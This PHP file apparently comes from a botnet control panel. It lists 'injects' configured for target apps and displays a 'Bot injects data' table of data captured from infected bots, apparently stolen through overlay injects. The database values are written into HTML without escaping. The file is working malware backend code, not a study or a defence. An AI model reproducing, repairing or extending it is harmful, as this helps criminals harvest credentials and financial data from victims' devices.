<?php
	include "config.php";
	
	print_header();
	
	print_menu();
	
	$html = "
	
	<div class=\"row\">
    <!--<div class=\"col-lg-6\">
	  <form action=\"/action_page.php\">
		<div class=\"form-group\">
		  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"Enter name inject\" name=\"num\">
		</div>
		<div class=\"form-group\">
		  <textarea class=\"form-control\" rows=\"5\" id=\"comment\"></textarea>
		</div>
		<div class=\"form-group\">
		  <input type=\"text\" class=\"form-control\" id=\"pwd\" placeholder=\"Enter country (us,ru)\" name=\"country\">
		</div>
		<button type=\"submit\" class=\"btn btn-default\">Send!</button>
	  </form>
	  </div>-->
	  <div class=\"col-lg-6\">
	  

	  
	  ";
	  $appsInj = get_list_injects();
	  $html .= "        
		  <table class=\"table table-bordered\">
			<thead>
			  <tr>
				<th>Name</th>
				<th>Op</th>
			  </tr>
			</thead>
			<tbody>
			  ";
			  foreach ($appsInj as $key=>$ai){
				  $html .= "<tr>
					<th><a href=\"list.php?op=filter_app&name=".$key."\">".$key."</a></th>";
					if($kernel['userid']==1 || $key==1){
						$html .= "<th><a href=# onClick=\"window.open('injects_show.php?id=".get_inject_id($key)."','pagename','resizable,height=600,width=400'); return false;\">show</a></th>";
					}else{
						$html .="<th>no permission</th>";
					}
				  $html .= "</tr>";
			  }
			 $html .="
			</tbody>
		  </table>
	  </div>
	  
	  
	  </div>
	
	<table class=\"table\">
    <thead>
      <tr>
        <th>Date</th>
        <th>BID</th>
        <th>Injects data</th>
        <th>App</th>
      </tr>
    </thead>
    <tbody>";
      
      $sql = "select * from injects_data";
      $res = $dbm->query($sql);
      if($dbm->count>0){
		  while($row=mysqli_fetch_array($res)) {
			  if(my_bot($row[1])){
				  $html .= "<tr>";
					$html .= "<th>".new_time($row[3])."</th>";
					$html .= "<th>".get_link_bot($row[1])."</th>";
					$inj = json_decode($row[2]);
					//var_dump($inj);
					$html .= "<th>".$inj->data."</th>";
					$injname = get_name_inject_from_id($inj->idinj);
					$html .= "<th><a href=\"list.php?op=filter_app&name=".$injname."\">".$injname."</a></th>";
				  $html .= "</tr>";
			}
		  }
	}
      
    $html.="</tbody>
  </table>
	";
	print_content("Bot injects data",$html);
	
	print_footer();

?>
